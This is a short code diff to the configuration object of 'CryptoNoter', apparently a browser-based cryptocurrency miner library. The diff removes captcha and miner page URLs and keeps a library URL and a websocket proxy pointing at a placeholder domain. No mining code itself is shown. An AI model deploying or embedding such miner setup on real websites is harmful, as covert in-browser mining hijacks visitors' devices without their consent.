@@ -490,7 +490,5 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
     LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
 };
